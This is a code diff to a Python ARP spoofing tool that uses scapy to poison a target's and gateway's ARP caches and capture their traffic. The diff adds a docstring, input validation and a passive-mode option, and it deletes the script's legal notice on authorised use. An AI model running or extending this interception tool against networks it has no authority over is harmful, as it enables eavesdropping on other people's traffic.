@@ -15,7 +15,6 @@ from scapy.layers.l2 import ARP, Ether
 from scapy.utils import wrpcap
 from scapy.config import conf
 from datetime import datetime
-from time import sleep
 import argparse
 import signal
 import sys
@@ -33,7 +32,28 @@ def get_mac(target_ip):
     return None
 
 class Arper:
-    def __init__(self, target: str, gateway: str, interface:str, count: int = 200, delay=2, autorestore: bool = True, active=True):
+    """
+    A class to perform ARP spoofing (cache poisoning) attacks on a target device.
+
+    This class facilitates both active and passive ARP spoofing strategies to intercept
+    network traffic between a target device and the gateway. It supports automatic
+    restoration of ARP tables upon attack completion or interruption.
+
+    Attributes:
+        target (str): IPv4 address of the target device.
+        gateway (str): IPv4 address of the network gateway.
+        interface (str): Network interface to use for the attack.
+        count (int): Number of packets to capture during the attack (default: 200).
+        delay (int): Delay in seconds between ARP spoofing packets (default: 2).
+        autorestore (bool): Flag to automatically restore ARP tables post-attack.
+        active (bool): Flag to select between active or passive attack mode.
+        poison_event (multiprocessing.Event): Event to control poisoning process.
+        sniff_process (multiprocessing.Process): Process handling packet capture.
+
+    Methods:
+        run(): Initiates the ARP spoofing attack with the configured parameters.
+    """
+    def __init__(self, target: str, gateway: str, interface:str, count: int = 200, delay=2, autorestore: bool = True, active=True, target_mac=None, gateway_mac=None):
         '''
         :param target: Target IPv4 address
         :param gateway: Gateway IPv4 address
@@ -41,21 +61,16 @@ class Arper:
         :param count: Number of packets to sniff, default is 200
         :param autorestore: Whether to restore ARP table automatically, default is True
         '''
-        try:
-            addr1, addr2 = ip_address(target), ip_address(gateway)
-            if (addr1.version != 4) or (addr2.version != 4):
-                raise InvalidIPAddressError('ARP cache poisoning requires IPv4 addresses')
-        except ValueError as e:
-            raise InvalidIPAddressError(f'Invalid IP format: {e}') from e
+        # Raise an error immediately during initialisation for invalid input
+        is_valid_ipv4((target, gateway))
+        # Configured to spoof responses solely upon detecting ARP requests, but omitted the target and gateway MAC addresses
+        if (not active) and not (target_mac and gateway_mac):
+            raise InvalidConfigurationError('PassiveAttacker selected, but target and gateway MAC addresses not provided')
         self.autorestore = autorestore
         self.target = target
-        self.target_mac = get_mac(self.target)
-        if self.target_mac is None:
-            raise MACNotFoundError(f'Target device ({target}) unreachable')
         self.gateway = gateway
-        self.gateway_mac = get_mac(gateway)
-        if self.gateway_mac is None:
-            raise MACNotFoundError(f'Gateway ({gateway}) unreachable')
+        self.target_mac = target_mac
+        self.gateway_mac = gateway_mac
         self.count = count
         self.interface = interface
         self.delay = delay
@@ -65,12 +80,14 @@ class Arper:
         conf.iface = interface
         conf.verb = 0
 
-        print(f'{BLUE_BOLD}Initialised {interface}: {RESET}')
-        print(f'{BLUE_BOLD}Gateway ({gateway}) is at {self.gateway_mac}. {RESET}')
-        print(f'{RED_BOLD}Target ({target}) is at {self.target_mac}{RESET}')
-        print('-' * 30)
+        print(f'{BLUE_BOLD}Currently using interface {interface}: {RESET}')
 
     def run(self):
+        self.target_mac = get_mac(self.target) if self.target_mac is None else self.target_mac
+        self.gateway_mac = get_mac(self.gateway) if self.gateway_mac is None else self.gateway_mac
+        if not (self.target_mac and self.gateway_mac):
+            raise MACNotFoundError('Target or gateway unreachable')
+
         with IPForwarding():
             attacker = ActiveAttacker() if self.active else PassiveAttacker()
             # An Event instance is created if and only if the ActiveAttacker strategy is selected
@@ -267,6 +284,16 @@ class PassiveAttacker:
 def handle_sigint(signum, frame):
     raise KeyboardInterrupt
 
+def is_valid_ipv4(addrs):
+    addr1, addr2 = addrs
+    try:
+        addr1, addr2 = ip_address(addr1), ip_address(addr2)
+        if (addr1.version != 4) or (addr2.version != 4):
+            raise InvalidIPAddressError('ARP cache poisoning requires IPv4')
+    except ValueError:
+        raise InvalidIPAddressError(f'Invalid IP format: {(addr1, addr2)}')
+
+
 class NoInterrupt:
     """
     Prevent users from repeatedly triggering KeyboardInterrupt, 
@@ -303,6 +330,9 @@ class InvalidIPAddressError(ARPSpoofingError):
 class MACNotFoundError(ARPSpoofingError):
     pass
 
+class InvalidConfigurationError(ARPSpoofingError):
+    pass
+
 if __name__ == '__main__':
     '''ARP Spoofing Tool'''
     if os.getuid() != 0:
@@ -313,11 +343,7 @@ if __name__ == '__main__':
         description='ARP Spoofing Tool\nThis tool performs ARP spoofing attacks, allowing interception of network traffic from target devices.',
         epilog='''Examples:
   %(prog)s 192.168.1.100 -g 192.168.1.1
-  %(prog)s 192.168.1.100 -g 192.168.1.1 -i eth0 -num 500 --no-restore
-
-Legal Notice:
-  Unauthorised use of this tool to attack networks may result in criminal charges.
-  For authorised security testing purposes only.'''
+  %(prog)s 192.168.1.100 -g 192.168.1.1 -i eth0 -num 500 --no-restore'''
     )
     
     parser.add_argument(
@@ -358,7 +384,11 @@ Legal Notice:
     args = parser.parse_args()
 
     try:
-        myarp = Arper(args.target, args.gateway, args.interface, args.num, autorestore=args.n)
+        myarp = Arper(target=args.target, 
+                      gateway=args.gateway, 
+                      interface=args.interface, 
+                      count=args.num, 
+                      autorestore=args.n)
         myarp.run()
     except (InvalidIPAddressError, MACNotFoundError) as e:
         print(f'{RED_BOLD}Configuration error: {e}{RESET}')
